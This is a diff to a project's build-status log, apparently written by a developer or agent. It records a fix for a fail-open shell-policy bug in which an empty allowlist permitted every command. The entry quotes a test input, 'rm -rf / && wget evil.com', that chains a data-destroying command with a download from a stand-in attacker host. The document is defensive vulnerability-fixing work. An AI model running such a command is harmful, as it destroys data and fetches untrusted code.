@@ -1,6 +1,6 @@
 # Build Status
 
-Last updated: 2026-07-10 08:40 UTC
+Last updated: 2026-07-10 09:10 UTC
 
 ## Current Workstream: Validation-Harness Overhaul
 
@@ -536,6 +536,40 @@ Not done this session: idempotent retry enforcement for INCUS mutating
 actions specifically, and a live rerun of `INCUS-006`'s timeout/
 partial-completion/retry/cleanup paths (blocked on the same live-delegate
 gap as FX-A bullet 6).
+
+### Completed This Session, continued: SR-1.8 (shell default-deny — fifth confirmed critical finding)
+
+Continuing the SR-1.x sweep, found and fixed a fifth critical
+authorization-bypass vulnerability this session, and the most starkly
+confirmed one: `ShellPolicyEngine.check_command()`
+(`missy/policy/shell.py`) had an explicit code comment stating "Empty
+allowed_commands means allow-all (shell is unrestricted when enabled)"
+— directly contradicting `ShellPolicy.allowed_commands`'s own docstring
+("An empty list means no commands are allowed even when enabled is
+True") and every piece of operator-facing documentation
+(`docs/configuration.md`, `docs/security.md`, `docs/troubleshooting.md`),
+all of which already correctly promised deny-all. A pre-existing test
+(`tests/policy/test_shell.py::test_empty_allowlist_allows_compound`,
+now fixed) literally asserted
+`engine.check_command("rm -rf / && wget evil.com")` returned `True`
+under `ShellPolicy(enabled=True, allowed_commands=[])` — the exact
+default an operator reaches by simply setting `shell.enabled: true`
+without also remembering to populate `allowed_commands`.
+
+Fixed: `check_command()` now raises `PolicyViolationError` when
+`allowed_commands` is empty, aligning the implementation with its own
+already-correct documented contract (no doc changes were needed — only
+the code was wrong). Fixed 4 pre-existing tests that had encoded the
+vulnerable behavior as expected, added a new explicit
+empty-allowlist-denies test alongside the existing
+explicit-allowlist-permits test. Full suite green (20755 tests) with no
+other hidden dependencies on the old behavior found anywhere in the
+codebase.
+
+This is the fifth independent, confirmed critical finding this session
+from the same systematic audit pattern (unauthenticated/unrestricted
+action reachable due to a fail-open default), after SR-1.2/1.3, SR-1.12,
+and SR-1.13 (×2).
 
 ### Known Pre-Existing Failure (not caused by this session)
 
